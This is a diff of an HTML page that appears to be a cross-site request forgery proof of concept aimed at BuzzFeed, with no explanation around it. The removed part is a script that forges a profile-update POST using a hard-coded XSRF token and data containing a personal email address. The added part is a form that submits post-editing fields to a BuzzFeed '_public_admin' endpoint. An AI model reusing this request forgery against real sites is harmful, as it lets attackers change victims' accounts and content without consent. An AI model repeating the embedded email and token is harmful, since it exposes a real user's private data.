@@ -7,20 +7,32 @@
   
   
   <body>
-   <script>
-    var url="https://www.buzzfeed.com/settings/api/v1/user-profile";
-    
-    var data={"username":"vbanxxxxxx","display_name":"lm","email":"saadajamalok@gmail.com","image":"/static/user_images/vCnkWgLAn.jpg?output-format=jpg&crop=281%253A281%253B109%252C0","header_image":"","header_alt_text":"","bio":null,"age":null,"organization":null,"link":null,"twitter_page_url":null,"twitter_widget":"","facebook_page_url":null,"public_dashboard":true,"queued_notification":0,"promoted_notification":0,"fetchingUserProfile":false,"fetchingMsgPrefs":false,"savingUserProfile":false,"savingMsgPrefs":false,"userProfileSaved":false,"msgPrefsSaved":false,"sendingGdprRequest":false,"gdprResponseReceived":false,"sendingDeleteAccountRequest":false,"deleteAccountRequestReceived":false,"dataAccessRequestReceived":false,"sendingDataAccessRequest":false,"error":null}
-    
-    var xhr=new XMLHttpRequest();
-    
-    xhr.open("POST",url,true);
-   
-    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-    xhr.setRequestHeader('X-Xsrftoken','2|5b9ee41a|f7d61295e4267ae834aa5a809c9e24d9|1609963477');
-    
-    
-    xhr.send(JSON.stringify(data));
-   </script>
+    <form action='https://community.buzzfeed.com/api/buzzfeed/_public_admin' method='post'>
+      
+      <input type='text' name='title' value='Lionel'>
+      <input type='text' name='text' value='LM10'>
+      <input type='text' name='sub_buzz_replacements' value=''>
+      <input type='text' name='sub_buzz_ids' value='126300627'>
+      <input type='text' name='display_name' value='buzzzzzzzzzzzfeeeeeeee'>
+      <input type='text' name='image' value='%2Fstatic%2F2021-01%2F12%2F16%2Ftmp%2Fca4c9b037fba%2Ftmp-name-2-6168-1610469864-26.jpg'>
+      <input type='text' name='original_image' value='%2Fstatic%2F2021-01%2F12%2F16%2Fenhanced%2F792d7102656e%2Foriginal-6107-1610469830-41.jpg'>
+      <input type='text' name='original_image_width' value='1280'>
+      <input type='text' name='original_image_height' value='720'>
+      <input type='text' name='original_image_crop_data' value='%7B%22big%22%3A%7B%22top%22%3A0%2C%22left%22%3A0%2C%22width%22%3A1082%2C%22height%22%3A720%7D%2C%22thumb%22%3A%7B%22top%22%3A0%2C%22left%22%3A0%2C%22width%22%3Anull%2C%22height%22%3Anull%7D%2C%22wide%22%3A%7B%22top%22%3A170%2C%22left%22%3A0%2C%22width%22%3A1082%2C%22height%22%3A380%7D%7D'>
+      <input type='text' name='list_format_visual' value='none'>
+      <input type='text' name='thumbnail_alt_text' value=''>
+      <input type='text' name='post_type' value='quickpost'>
+      <input type='text' name='uri' value='test-eehb0m4oc9'>
+      <input type='text' name='type' value='super'>
+      <input type='text' name='template' value='quickpost_super+mobile_preview_buzz+mobile_preview_form+preview_buzz'>
+      <input type='text' name='campaignid' value='5834569'>
+      <input type='text' name='delete_images' value='no'>
+      <input type='text' name='username' value='buzzzzzzzzzzzfeeeeeeee'>
+      <input type='text' name='buzz' value='%7B%22blurb%22%3A%22LM10%22%2C%22campaignid%22%3A%225834569%22%2C%22clientid%22%3A1%2C%22display_name%22%3A%22buzzzzzzzzzzzfeeeeeeee%22%2C%22form%22%3A%22super%22%2C%22image_buzz%22%3A%22%2Fstatic%2F2021-01%2F12%2F16%2Ftmp%2Fca4c9b037fba%2Ftmp-name-2-6168-1610469864-26.jpg%22%2C%22name%22%3A%22Lionel%22%2C%22origin%22%3A%22quickpost%22%2C%22username%22%3A%22buzzzzzzzzzzzfeeeeeeee%22%2C%22list_format_visual%22%3A%22none%22%2C%22post_format_visual%22%3A%22standard%22%2C%22additional_sections%22%3A%5B%5D%7D'>
+      <input type='text' name='post_format_visual' value='standard'>
+      <input type='text' name='id' value='5834569'>
+      <input type='text' name='origin' value='quickpost'>
+      <input type='text' name='action' value='save'>
+      
   </body>
 </html>
